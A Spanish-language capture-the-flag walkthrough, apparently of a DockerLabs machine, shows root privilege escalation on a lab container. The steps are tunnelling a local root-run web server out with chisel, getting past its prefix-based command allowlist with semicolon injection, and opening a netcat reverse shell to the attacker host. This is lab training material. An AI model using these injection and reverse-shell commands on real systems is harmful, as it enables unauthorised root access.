Básicamente existe un servidor web en la máquina en el puerto 25,000 y podemos ejecutar comandos solo si damos un parámetro `exec`, siempre que el servidor reciba la llave de autenticación (Auth key) en base64, Y solo ejecuta el comando si el valor del parámetro `exec` comienza con `ls` o con `whoami`.

Para verificar esto, veamos si existe este servidor.
Ejecutemos **ss** para ver si el puerto 25000 se está usando actualmente.

```r
$ ss -tuln
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                        Peer Address:Port                   Process                   
tcp                     LISTEN                   0                        128                                              0.0.0.0:80                                               0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                               0.0.0.0:*                                                
tcp                     LISTEN                   0                        5                                              127.0.0.1:25000                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                                 [::]:22                                                  [::]:*
```

Y podemos ver que el puerto 25000 se está usando en la máquina LOCAL.

Hagamos una solicitud con curl para ver si es un servidor web.

```r
$ curl http://localhost:25000; echo  
Authorization header is missing or incorrect
```

Y podemos ver que es exactamente la misma página. Veamos qué usuario está ejecutando este proceso.

```r
$ ps aux | grep serverpi
root           1  0.0  0.0   2584   392 ?        Ss   Jun27   0:00 /bin/sh -c service ssh start &&     python3 /var/www/html/serverpi.py &     python3 /opt/cybersecurity_company/app.py &     tail -f /dev/null
root           7  0.0  0.1  24676  6372 ?        S    Jun27   0:07 python3 /var/www/html/serverpi.py
```

¡El usuario root está ejecutando el servidor! Así que si ejecutamos comandos, los ejecutaremos como el usuario root.

Así que hagamos redirección de puertos (port forwarding), porque hacer solicitudes con curl en la máquina objetivo es bastante molesto.

Usaremos **chisel** para montar un servidor, así que compartiré el archivo con `scp` y las credenciales del usuario `flipsy`.

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ scp /usr/bin/chisel flipsy@172.17.0.2:/tmp
flipsy@172.17.0.2's password: 
chisel                                                                              100%   10MB  19.0MB/s   00:00
```

Bien, ahora montemos el servidor en nuestra máquina de ataque.

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ chisel server --reverse -p 1111
2026/06/27 19:17:13 server: Reverse tunnelling enabled
2026/06/27 19:17:13 server: Fingerprint TQ62UQFBZyqn0BE26vMdrW2bnXcBUT4p6QsYzLcOOdQ=
2026/06/27 19:17:13 server: Listening on http://0.0.0.0:1111
```

| Argumento  | Descripción                                                                                   |
| --------- | --------------------------------------------------------------------------------------------- |
| --reverse | Con esto, vamos a recibir la conexión de los clientes que recibimos en reverso. |
| -p        | El puerto para escuchar.                                                                        |

Okay, ahora en la máquina objetivo redirijamos el puerto 25000 con chisel y conéctemonos como cliente.

```r
$ cd /tmp
$ ./chisel client 172.17.0.1:1111 R:25000 & 
$ 2026/06/28 00:19:25 client: Connecting to ws://172.17.0.1:1111
2026/06/28 00:19:25 client: Connected (Latency 887.887µs)
```

| Argumento | Descripción                                                       |
| -------- | ----------------------------------------------------------------- |
| R:25000  | Estamos redirigiendo la conexión a este puerto de la máquina local. |
| &        | Este símbolo "&" es para ejecutar chisel en segundo plano.               |

Y podemos recibir esto en nuestro servidor chisel:

```c
2026/06/27 19:19:25 server: session#1: tun: proxy#R:25000=>25000: Listening
```

Okay, ahora en la máquina objetivo veamos si podemos conectar.

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ curl http://localhost:25000
Authorization header is missing or incorrect
```

¡Genial! Ahora intentemos ejecutar un comando con la llave de autenticación, incluyendo el encabezado con `-H` y el parámetro para ejecutar el comando.

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ curl -s http://localhost:25000?exec=whoami -H 'Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo='
root
```

¡Genial! Ahora podemos ejecutar comandos, pero tenemos una restricción. ¿Por qué? Porque hay una lista de comandos permitidos, pero podemos burlarla.

Como el script verifica si el parámetro `exec` en la URL comienza con uno de los comandos permitidos, ¿lo captas?

Podemos burlar esto con un punto y coma y ejecutar otro comando que no esté dentro de la lista de comandos permitidos, algo así: `?exec=whoami;id` porque el script de Python solo está verificando el comienzo del comando si comienza con `whoami`.

Veamos si funciona.

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ curl -s 'http://localhost:25000?exec=whoami;id' -H 'Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo='
root
uid=0(root) gid=0(root) groups=0(root)
```

¡Genial! Hagamos otra reverse shell, abramos otro listener de netcat.

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
```

Ahora ejecutemos el comando:

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ curl -s 'http://localhost:25000/?exec=whoami;nc%20172.17.0.1%202222%20-e%20/bin/sh' -H 'Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo='
```

Si no conoces, las partes que son `%20` son el formato codificado de un espacio en una URL.

Y recibimos esto:

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 52442
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
script /dev/null -c sh
Script started, output log file is '/dev/null'.
#
```

¡Ahora somos root! ***...pwned..!***
